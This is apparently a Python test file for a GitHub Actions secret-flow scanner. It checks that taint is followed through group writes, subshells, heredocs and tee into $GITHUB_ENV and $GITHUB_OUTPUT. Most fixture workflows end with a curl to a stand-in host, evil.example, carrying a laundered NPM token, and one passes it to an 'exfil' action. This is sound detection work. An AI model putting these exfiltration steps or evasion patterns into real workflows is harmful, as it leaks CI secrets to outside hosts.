"""Tests for evasion-shape redirect handling in ``gha_secret_flow``:
group writes, subshells, heredocs, and tee.  Each is a different
bash redirect mechanism that an attacker would reach for the moment
the simple per-line ``echo X=Y >> $GITHUB_ENV`` pattern is detected.
"""

from __future__ import annotations

from pathlib import Path

from packages.sca.supply_chain.gha_secret_flow import scan_target


def _write_wf(tmp_path: Path, name: str, body: str) -> Path:
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    p = wf_dir / name
    p.write_text(body, encoding="utf-8")
    return p


def _downstream_fires(hits, idx: int) -> bool:
    """True iff some run_block hit fires on the indexed step."""
    return any(
        h.sink_kind == "run_block" and h.step_index == idx
        for h in hits
    )


# ---------------------------------------------------------------------------
# Group write — { ... } >> $GITHUB_ENV
# ---------------------------------------------------------------------------

def test_group_write_to_github_env_propagates(tmp_path: Path) -> None:
    """Multi-line bash group writing to $GITHUB_ENV."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          {
            echo "TOK=${{ secrets.NPM_TOKEN }}"
            echo "OTHER=value"
          } >> $GITHUB_ENV
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


def test_group_write_only_taints_secret_derived_keys(
    tmp_path: Path,
) -> None:
    """Group write where SOME keys are secret-derived, others static
    — the static keys must NOT propagate taint."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          {
            echo "TOK=${{ secrets.NPM_TOKEN }}"
            echo "VERSION=1.2.3"
          } >> $GITHUB_ENV
      - run: curl https://example.com/?v=$VERSION
""")
    hits = scan_target(tmp_path, [], [])
    # Step 1 references $VERSION which is NOT secret-derived; no
    # finding from this step's taint propagation.
    assert not _downstream_fires(hits, 1)


# ---------------------------------------------------------------------------
# Subshell — ( ... ) >> $GITHUB_ENV
# ---------------------------------------------------------------------------

def test_subshell_write_to_github_env_propagates(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          (
            echo "TOK=${{ secrets.NPM_TOKEN }}"
          ) >> $GITHUB_ENV
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


# ---------------------------------------------------------------------------
# Heredoc — cat <<EOF >> $GITHUB_ENV ... EOF
# ---------------------------------------------------------------------------

def test_heredoc_to_github_env_propagates(tmp_path: Path) -> None:
    """Plain heredoc to $GITHUB_ENV — variable expansion happens."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: |
          cat <<EOF >> $GITHUB_ENV
          TOK=$NPM_TOKEN
          EOF
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


def test_heredoc_with_quoted_delim_still_propagates(tmp_path: Path) -> None:
    """``<<'EOF'`` quotes the delimiter — preserves literal ``$X``.
    From a taint perspective this is STILL a launder: the literal
    ``TOK=$NPM_TOKEN`` written to the GITHUB_ENV file becomes the
    env binding ``TOK=$NPM_TOKEN`` which a downstream step expands
    via the shell.  We treat the laundered KEY as tainted because
    the body LITERALLY contains a tainted ref."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: |
          cat <<'EOF' >> $GITHUB_ENV
          TOK=$NPM_TOKEN
          EOF
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


def test_heredoc_with_dash_strips_tab_indent(tmp_path: Path) -> None:
    """``<<-EOF`` allows tab-indented delimiter line."""
    body = (
        "on: push\n"
        "jobs:\n"
        "  j:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - env:\n"
        "          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n"
        "        run: |\n"
        "          cat <<-EOF >> $GITHUB_ENV\n"
        "          \tTOK=$NPM_TOKEN\n"
        "          \tEOF\n"
        "      - run: curl https://evil.example/?t=$TOK\n"
    )
    _write_wf(tmp_path, "wf.yml", body)
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


def test_heredoc_without_secret_does_not_propagate(tmp_path: Path) -> None:
    """A heredoc to $GITHUB_ENV with only static values should not
    propagate taint to downstream steps."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          cat <<EOF >> $GITHUB_ENV
          VERSION=1.2.3
          STAGE=prod
          EOF
      - run: curl https://example.com/?v=$VERSION
""")
    hits = scan_target(tmp_path, [], [])
    assert hits == []


# ---------------------------------------------------------------------------
# Tee — echo X=Y | tee -a $GITHUB_ENV
# ---------------------------------------------------------------------------

def test_tee_to_github_env_propagates(tmp_path: Path) -> None:
    """``| tee -a $GITHUB_ENV`` — append mode is the common form."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "TOK=${{ secrets.NPM_TOKEN }}" | tee -a $GITHUB_ENV
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


def test_tee_without_append_flag_also_propagates(tmp_path: Path) -> None:
    """``| tee $GITHUB_ENV`` — overwrite mode (rare in practice for
    $GITHUB_ENV but bash allows it).  Still propagates the binding."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "TOK=${{ secrets.NPM_TOKEN }}" | tee $GITHUB_ENV
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


# ---------------------------------------------------------------------------
# Mixed cross-step: heredoc launder + action sink
# ---------------------------------------------------------------------------

def test_heredoc_launder_then_untrusted_action_fires(
    tmp_path: Path,
) -> None:
    """Heredoc writes to $GITHUB_OUTPUT, downstream step passes the
    laundered output into an untrusted action."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - id: launder
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: |
          cat <<EOF >> $GITHUB_OUTPUT
          TOK=$NPM_TOKEN
          EOF
      - uses: nobody/exfil@v1
        with:
          payload: ${{ steps.launder.outputs.TOK }}
""")
    hits = scan_target(tmp_path, [], [])
    untrusted = [h for h in hits if h.sink_kind == "untrusted_action"]
    assert untrusted and untrusted[0].severity == "high"
